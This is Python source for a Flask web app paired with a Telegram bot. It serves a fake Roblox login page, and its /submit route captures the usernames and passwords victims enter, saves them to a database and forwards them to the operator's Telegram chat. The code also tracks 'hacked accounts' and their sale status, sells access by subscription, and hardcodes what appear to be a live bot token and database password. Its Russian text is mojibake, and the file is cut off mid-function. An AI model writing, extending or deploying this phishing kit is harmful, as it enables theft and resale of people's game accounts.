from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # –í–∞—à —Ç–æ–∫–µ–Ω
ADMIN_CHAT_ID = '6956377285'  # –í–∞—à chat_id (–°–æ–∑–¥–∞—Ç–µ–ª—å)
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤–∞ ===
tech_break = None

# === –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —á–∞—Å–æ–≤–æ–≥–æ –ø–æ—è—Å–∞ (UTC+2) ===
def get_current_time():
    return datetime.now() + timedelta(hours=2)  # –î–æ–±–∞–≤–ª—è–µ–º 2 —á–∞—Å–∞ –∫ UTC –¥–ª—è UTC+2

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö ===
def get_db_connection():
    try:
        conn = psycopg2.connect(DATABASE_URL)
        print("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –ë–î —É—Å–ø–µ—à–Ω–æ")
        return conn
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –ë–î - –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º –±–µ–∑ –ë–î")
        return False
    try:
        c = conn.cursor()
        print("–°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É 'users', –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
        print("–°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É 'credentials', –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
        print("–°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—É 'hacked_accounts', –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
        print(f"–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –°–æ–∑–¥–∞—Ç–µ–ª—è –¥–ª—è {ADMIN_CHAT_ID}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                  (ADMIN_CHAT_ID, "–°–æ–∑–¥–∞—Ç–µ–ª—å", subscription_end))
        conn.commit()
        conn.close()
        print("–ë–î —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –ë–î: {e}")
        conn.close()
        return False

# === Keep-alive –¥–ª—è Render ===
def keep_alive():
    while True:
        try:
            response = requests.get(SITE_URL)
            print(f"üîÅ –ü–∏–Ω–≥: {response.status_code} - {response.text[:50]}")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ keep-alive: {e}")
        time.sleep(60)  # –ü–∏–Ω–≥ –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É

# === –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –±–∞–∑–æ–π ===
def get_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        if chat_id == ADMIN_CHAT_ID:
            print(f"–ñ–µ—Å—Ç–∫–æ –∑–∞–¥–∞–µ–º –°–æ–∑–¥–∞—Ç–µ–ª—è –¥–ª—è {chat_id}")
            return {
                'prefix': '–°–æ–∑–¥–∞—Ç–µ–ª—å',
                'subscription_end': get_current_time() + timedelta(days=3650),
                'site_clicks': 0,
                'password_views': 0
            }
        return None
    try:
        c = conn.cursor()
        c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–∞–π–¥–µ–Ω: {result}")
            return {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'site_clicks': result[2],
                'password_views': result[3]
            }
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return None
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ get_user –¥–ª—è {chat_id}: {e}")
        conn.close()
        return None

def save_user(chat_id, prefix, subscription_end=None):
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return
    try:
        c = conn.cursor()
        if subscription_end is None:
            subscription_end = get_current_time().isoformat()
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                  (chat_id, prefix, subscription_end, prefix, subscription_end))
        conn.commit()
        conn.close()
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} —Å–æ—Ö—Ä–∞–Ω–µ–Ω —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º {prefix}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: {e}")
        conn.close()

def increment_site_clicks(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –∫–ª–∏–∫–∏ –¥–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return
    try:
        c = conn.cursor()
        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"–ö–ª–∏–∫–∏ –Ω–∞ —Å–∞–π—Ç —É–≤–µ–ª–∏—á–µ–Ω—ã –¥–ª—è {chat_id}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–≤–µ–ª–∏—á–µ–Ω–∏—è –∫–ª–∏–∫–æ–≤ –¥–ª—è {chat_id}: {e}")
        conn.close()

def increment_password_views(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ—Å–º–æ—Ç—Ä—ã –ø–∞—Ä–æ–ª–µ–π –¥–ª—è {chat_id}: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return
    try:
        c = conn.cursor()
        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"–ü—Ä–æ—Å–º–æ—Ç—Ä—ã –ø–∞—Ä–æ–ª–µ–π —É–≤–µ–ª–∏—á–µ–Ω—ã –¥–ª—è {chat_id}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–≤–µ–ª–∏—á–µ–Ω–∏—è –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è {chat_id}: {e}")
        conn.close()

def save_credentials(login, password):
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        added_time = get_current_time().isoformat()
        c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                  (login, password, added_time, password, added_time))
        conn.commit()
        conn.close()
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã: login={login}, password={password}")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
        conn.close()
        return False

def delete_credentials(login):
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        conn.close()
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —É–¥–∞–ª–µ–Ω—ã: login={login}")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
        conn.close()
        return False

def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        hack_date = get_current_time().isoformat()
        c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
                  "VALUES (%s, %s, %s, %s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
                  (login, password, hack_date, prefix, sold_status, linked_chat_id,
                   password, hack_date, prefix, sold_status, linked_chat_id))
        conn.commit()
        conn.close()
        print(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω: login={login}, password={password}, sold_status={sold_status}")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        conn.close()
        return False

def delete_hacked_account(login):
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        conn.commit()
        conn.close()
        print(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç —É–¥–∞–ª–µ–Ω: login={login}")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        conn.close()
        return False

def delete_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª–µ–Ω: chat_id={chat_id}")
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {e}")
        conn.close()
        return False

def get_credentials():
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        print(f"–£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã: {result}")
        return result
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {e}")
        conn.close()
        return []

def get_hacked_accounts():
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        print(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã –ø–æ–ª—É—á–µ–Ω—ã: {result}")
        return result
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤: {e}")
        conn.close()
        return []

def get_all_users():
    conn = get_db_connection()
    if conn is None:
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
        result = c.fetchall()
        conn.close()
        print(f"–í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –ø–æ–ª—É—á–µ–Ω—ã: {result}")
        return result
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {e}")
        conn.close()
        return []

# === –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ —Å –º–∏–Ω—É—Ç–∞–º–∏ ===
def format_time_with_minutes(iso_time):
    added_time = datetime.fromisoformat(iso_time)
    current_time = get_current_time()
    minutes_passed = int((current_time - added_time).total_seconds() / 60)
    return f"{added_time.strftime('%Y-%m-%d %H:%M:%S')} ({minutes_passed} –º–∏–Ω –Ω–∞–∑–∞–¥)"

# === –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ ===
def check_access(chat_id, command):
    global tech_break
    print(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –¥–ª—è {chat_id} –Ω–∞ –∫–æ–º–∞–Ω–¥—É {command}")
    user = get_user(chat_id)
    if user is None and command in ['start', 'menu', 'getchatid']:
        save_user(chat_id, "–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å")
        user = get_user(chat_id)
    
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - get_current_time()).total_seconds() / 60
        if time_left > 0:
            return f"‚è≥ –°–µ–π—á–∞—Å –∏–¥–µ—Ç —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤. –û–∫–æ–Ω—á–∞–Ω–∏–µ —á–µ—Ä–µ–∑ {int(time_left)} –º–∏–Ω—É—Ç."
    if not user or user['prefix'] == '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
        if command in ['start', 'menu', 'getchatid']:
            return None
        return "üîí –í—ã –º–æ–∂–µ—Ç–µ –∫—É–ø–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É —É @sacoectasy.\n–ó–¥–µ—Å—å –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–≤–æ–π ID: /getchatid"
    if user['subscription_end'] and user['subscription_end'] < get_current_time():
        save_user(chat_id, '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', get_current_time())
        return "üîí –í–∞—à–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –∏—Å—Ç–µ–∫–ª–∞! –ö—É–ø–∏—Ç–µ –Ω–æ–≤—É—é —É @sacoectasy.\n–ó–¥–µ—Å—å –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–≤–æ–π ID: /getchatid"
    if command in ['passwords', 'admin'] and user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        return "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –ê–¥–º–∏–Ω–∞ –∏ –°–æ–∑–¥–∞—Ç–µ–ª—è!"
    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        return "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –°–æ–∑–¥–∞—Ç–µ–ª—è!"
    print(f"–î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω –¥–ª—è {chat_id} –Ω–∞ {command}")
    return None

# === Flask –º–∞—Ä—à—Ä—É—Ç—ã ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            print(f"–ü–æ–ª—É—á–µ–Ω –ª–æ–≥–∏–Ω: {login}, –ø–∞—Ä–æ–ª—å: {password}")
            if save_credentials(login, password):
                bot.send_message(ADMIN_CHAT_ID, f"üîê –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω:\n–õ–æ–≥–∏–Ω: {login}\n–ü–∞—Ä–æ–ª—å: {password}")
            else:
                print("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ –ë–î")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ /submit: {e}")
        return "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            print(f"–ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –≤–µ–±—Ö—É–∫–∞: {json_string}")
            update = telebot.types.Update.de_json(json_string)
            if update and (update.message or update.callback_query):
                print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è: {update}")
                bot.process_new_updates([update])
                print("–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ")
            else:
                print("–í –¥–∞–Ω–Ω—ã—Ö –≤–µ–±—Ö—É–∫–∞ –Ω–µ—Ç –≤–∞–ª–∏–¥–Ω–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è")
            return 'OK', 200
        else:
            print(f"–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –∑–∞–ø—Ä–æ—Å–∞: {request.headers.get('content-type')}")
            return '–ù–µ–≤–µ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å', 400
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ –≤–µ–±—Ö—É–∫–µ: {e}")
        return '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞', 500


# === –ö–æ–º–∞–Ω–¥—ã –±–æ—Ç–∞ ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /start –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "‚úÖ –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu –¥–ª—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–∞–Ω–¥.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /menu –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω –¥–ª—è {chat_id}: {access}")
        bot.reply_to(message, access)
        return
    
    user = get_user(chat_id)
    print(f"–î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è {chat_id}: {user}")
    
    if user:
        time_left = (user['subscription_end'] - get_current_time()).days if user['subscription_end'] else 0
        time_str = f"{time_left} –¥–Ω–µ–π" if time_left > 0 else "–ò—Å—Ç–µ–∫–ª–∞"
        response = f"üë§ –í–∞—à –ø—Ä–µ—Ñ–∏–∫—Å: {user['prefix']}\n‚è≥ –ü–æ–¥–ø–∏—Å–∫–∞: {time_str}"
        
        global tech_break
        if tech_break:
            tech_time_left = (tech_break - get_current_time()).total_seconds() / 60
            print(f"–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∞–∫—Ç–∏–≤–µ–Ω, –æ—Å—Ç–∞–ª–æ—Å—å: {tech_time_left} –º–∏–Ω—É—Ç")
            if tech_time_left > 0:
                response += f"\n‚è≥ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤: –¥–æ {tech_break.strftime('%H:%M')} (UTC+2), –æ—Å—Ç–∞–ª–æ—Å—å {int(tech_time_left)} –º–∏–Ω."
            else:
                tech_break = None
                print("–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∏—Å—Ç–µ–∫, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –Ω–∞ None")
        
        response += "\n\nüßæ –ö–æ–º–∞–Ω–¥—ã:\n/start\n/menu\n/getchatid"
        if user['prefix'] != '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
            response += "\n/site\n/techstop\n/techstopoff"
            if user['prefix'] in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
                response += "\n/passwords\n/admin"
            if user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
                response += "\n/hacked\n/database\n/adprefix\n/delprefix"
    else:
        response = "üßæ –ö–æ–º–∞–Ω–¥—ã:\n/start\n/menu\n/getchatid"
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–ª—è {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–∞–∑–æ–≤–æ–µ –º–µ–Ω—é")
    
    print(f"–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç –¥–ª—è {chat_id}: {response}")
    bot.reply_to(message, response)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /getchatid –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    user = get_user(chat_id)
    if user['prefix'] == '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
        bot.reply_to(message, f"üë§ –ó–¥–µ—Å—å –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–≤–æ–π ID: {chat_id}")
    else:
        bot.reply_to(message, f"üë§ –í–∞—à Chat ID: {chat_id}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /site –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    increment_site_clicks(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=SITE_URL))
    bot.reply_to(message, "üåê –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", reply_markup=markup)

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /techstop –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –≤—Ä–µ–º—è –≤ –º–∏–Ω—É—Ç–∞—Ö: /techstop <–º–∏–Ω—É—Ç—ã>")
        return
    minutes = int(args[0])
    tech_break = get_current_time() + timedelta(minutes=minutes)
    bot.reply_to(message, f"‚è≥ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ {minutes} –º–∏–Ω—É—Ç. –û–∫–æ–Ω—á–∞–Ω–∏–µ: {tech_break.strftime('%H:%M')} (UTC+2)")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /techstopoff –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    tech_break = None
    bot.reply_to(message, "‚úÖ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –æ—Ç–∫–ª—é—á–µ–Ω.")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
